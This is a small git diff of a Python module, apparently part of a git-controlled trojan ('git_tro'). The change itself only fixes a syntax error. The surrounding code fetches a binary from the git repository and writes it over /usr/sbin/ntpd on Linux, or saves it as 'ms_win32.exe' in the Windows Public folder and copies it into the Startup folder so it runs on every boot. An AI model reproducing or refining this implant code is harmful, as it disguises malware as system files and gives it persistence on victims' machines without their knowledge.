@@ -41,7 +41,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 	if os.name == 'posix':
 		filePath = "bin/test_svr" #"modules/dirlister.py" #
 		targetPath = "/usr/sbin/ntpd"
-		
+
 	elif os.name == 'nt': #TODO: CHeck win TargetPth
 		filePath = "bin/test" #"modules/dirlister.py" #
 		targetPath = os.getenv("PUBLIC")+"\ms_win32.exe"  #C:\Users\Public
@@ -59,7 +59,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 			    fich.close()
 				if winRunOnBoot == True:
 					startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
-					os.system("copy %s %s"%(targetPath, startPath)
+					os.system("copy %s %s"%(targetPath, startPath))
 			except PermissionError:
 				return ("[ERROR] getFileFromGit: Permission Denied!")
 
